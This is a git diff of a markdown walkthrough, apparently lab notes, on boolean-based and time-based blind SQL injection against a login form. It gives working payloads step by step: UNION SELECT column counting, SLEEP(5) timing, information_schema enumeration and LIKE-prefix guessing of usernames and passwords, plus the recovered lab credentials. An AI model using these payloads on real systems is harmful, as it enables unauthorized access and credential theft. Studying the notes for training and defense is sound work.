@@ -131,65 +131,76 @@ Boolean based SQL Injection refers to the response we receive back from our inje
 
       1.admin123' UNION SELECT 1;-- 
       2.admin123' UNION SELECT 1,2,3;--
-if response is true till 1,2,3 but flase in 1,2,3,4 ,the target column number is 3
+if response is true till 1,2,3 but flase in 1,2,3,4 ,the target column ***number is 3 ***
 
 #### Step 2:Find out database name
 
-      1.admin123' UNION SELECT 1,2,3 where database() like 'some character%';--
-        example:
-                admin123' UNION SELECT 1,2,3 where database() like 's%';--
+      admin123' UNION SELECT 1,2,3 where database() like 'some character%';--
+      example:
+              admin123' UNION SELECT 1,2,3 where database() like 's%';--
+ 
  Sequentially change the character and check the respons is true or flase
- suppose we got the database name  :sqli_three
+ suppose we got the ***database name  :sqli_three***
  
 #### Step 3:Find out table name
  
  
-      1.admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--         
+      admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--         
       
 Sequentially change the character and check the respons is true or flase
-suppose we got the table name  :users
+suppose we got the ***table name  :users***
 #### Step 4:Find out Column name
      
-     1.admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+      admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
 
-After,sequentially Repeating this process you will get column name
-suppose, the column name username and another is password
+After,sequentially Repeating this process you will get column name.
+suppose, the ***column name username and another is password***
 
 #### Step 5:Find out username column value
+      
       admin123' UNION SELECT 1,2,3 from users where username like 'a%
- After,sequentially Repeating this process you will get column username value and this is:admin.
+ 
+ After,sequentially Repeating this process you will get ***column username value and this is:admin.***
  
 #### Step 6:Find out password column value
 
         admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
 
-if you properly do this , you will get password 
+if you properly do this , you will get ***password and the credentials are username=admin ,password=3356 ***
+
 # Time Base SQL Injection
-A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
+
+A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as ***SLEEP(x)*** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
 So, for example, when trying to establish the number of columns in a table, you would use the following query:
       
       admin123' UNION SELECT SLEEP(5);--
+      
 #### Step 1:Find out actual column number
+      
       admin123' UNION SELECT SLEEP(5);--
 If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
+      
       admin123' UNION SELECT SLEEP(5),2;--
 if again no pause in the response time , increase column number like
+      
       admin123' UNION SELECT SLEEP(5),2,3;--
 ### Step 2:Find out dabase name 
       admin123' UNION SELECT SLEEP(5),2,3 where database() like 'u%';--
-Here dabase name :sqli_four      
+Here dabase ***name :sqli_four***     
 ### Step 3:Find out table name
       admin123' UNION SELECT SLEEp(5),2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
-Here table name:users
+Here ***table name:users***
+
 #### Step4:Find out Column name
+      
       admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
-Here Column name username and password
+Here Column name ***username and password***
 
 #### Step5:Findout Column value
       admin123' UNION SELECT SLEEP(5),2,3 from users where username like 'a%
- Here username:admin
+ Here ***username:admin***
       admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
- Here password:pass
+ Here ***password:pass***
  SO the target login credentials 
                                 ***username:admin
                                 password:pass***
